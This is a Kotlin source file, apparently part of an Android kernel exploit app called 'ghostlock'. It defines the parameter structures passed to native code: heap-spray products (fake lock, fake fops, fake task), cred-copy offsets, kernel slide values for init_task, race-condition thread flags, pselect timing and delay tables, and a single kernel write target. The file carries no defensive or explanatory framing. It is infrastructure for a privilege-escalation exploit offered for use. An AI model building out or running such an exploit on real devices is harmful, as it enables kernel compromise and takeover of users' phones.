package com.ghostlock.app.jni

/**
 * The parameter face of the six core functions, on the Kotlin side.
 *
 * Every field here corresponds one-for-one to a field of a native structure, and every native
 * structure corresponds to something the pure-C original read from file scope or from a
 * compile-time constant. Nothing in this file decides anything: it carries what the caller
 * decided, so the native side can stay a copy of the original.
 *
 * Two of the values below used to be environment variables read inside the execution layer
 * (GHOSTLOCK_TCP_ROUTE and PSELECT_TIMEOUT_OVERRIDE_USEC), and a third forced a delay
 * (PSELECT_DELAY_USEC). Those reads are not allowed there, which is why they are fields.
 */

/** Which fake-lock route runs. Replaces the original tcp_route_selected(), which read an env var. */
enum class RouteChoice(val code: Int) {
    Pselect(0),
    Tcp(1),
}

/** The three addresses both routes guard on; any zero is a refusal, not a guess. */
data class RouteAddrs(
    val pageBase: Long,
    val fakeLock: Long,
    val fakeFops: Long,
)

/** What the spray produced. */
data class SprayProducts(
    val pageBase: Long,
    val fakeLock: Long,
    val fakeFops: Long,
    val fakeW0: Long,
    val fakeTask: Long,
    val fakeRight: Long,
)

/** The offsets and slide values the spray and the word tables read. */
data class SprayOffsets(
    val credCopyOff: Long,
    val tcpCredCopyOff: Long,
    val w1PageOffset: Long,
    val slideInitTask: Long,
    val slideRootTaskGroup: Long,
    val fakeLeft: Long,
    val fakeParent: Long,
    val pselectCustomTarget: Long,
    val fakeParentDelta: Long,
)

/** The two switches the write path set through file scope. */
data class WriteModeState(
    val pselectCustomWrite: Int,
    val pselectChildNode: Int,
)

/** The pselect route tuning. Every value was a compile-time constant in the original. */
class PselectTuning(
    val cfiRouteAttempts: Int,
    val compactTimeoutSec: Int,
    val compactTimeoutUsec: Int,
    val routeNfdsPlus16: Int,
    val openSlack32: Int,
    val selectTimeoutSec: Int,
    val selectTimeoutUsec: Int,
    val consumerDrainIterations: Int,
    val consumerDrainUsec: Int,
    val waiterPrio: Int,
    /** The per-attempt delay table, indexed modulo its own length. */
    val delayTable: IntArray = DEFAULT_DELAY_TABLE,
    /** A forced delay; zero means use the table. Replaces PSELECT_DELAY_USEC. */
    val delayOverrideUsec: Int = 0,
) {
    init {
        require(waiterPrio in 0..Int.MAX_VALUE) { "waiterPrio out of range" }
        require(delayTable.isNotEmpty()) { "delayTable must not be empty" }
    }

    companion object {
        /** The eight values from the original table, in their original order. */
        val DEFAULT_DELAY_TABLE = intArrayOf(50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000)
    }
}

/** The thirteen flags the three threads hand each other. */
data class RaceFlags(
    var waiterTid: Int = 0,
    var waiterReady: Int = 0,
    var waiterWaiting: Int = 0,
    var ownerStarted: Int = 0,
    var ownerChainDone: Int = 0,
    var ownerStop: Int = 0,
    var routeDone: Int = 0,
    var punchConsumeStop: Int = 0,
    var punchConsumeGo: Int = 0,
    var consumerCalls: Int = 0,
    var consumerSuccess: Int = 0,
    var consumerInflight: Int = 0,
    var mainRouteDelayUsec: Int = 0,
)

/** One write: the four values the original entry took. */
data class WriteOneParams(
    val target: Long,
    val desc: String,
    val mode: Int,
    val leaf: Int,
)

/** The bounds the direct-map check uses. */
data class DirectMapBounds(val begin: Long, val end: Long)

/** Everything one run needs, assembled by the caller. */
data class SessionParameters(
    val route: RouteChoice,
    val addrs: RouteAddrs,
    val products: SprayProducts,
    val offsets: SprayOffsets,
    val tuning: PselectTuning,
    val write: WriteOneParams,
    val bounds: DirectMapBounds,
    val waiterShift: Int,
    val compactWaiter: Boolean,
)
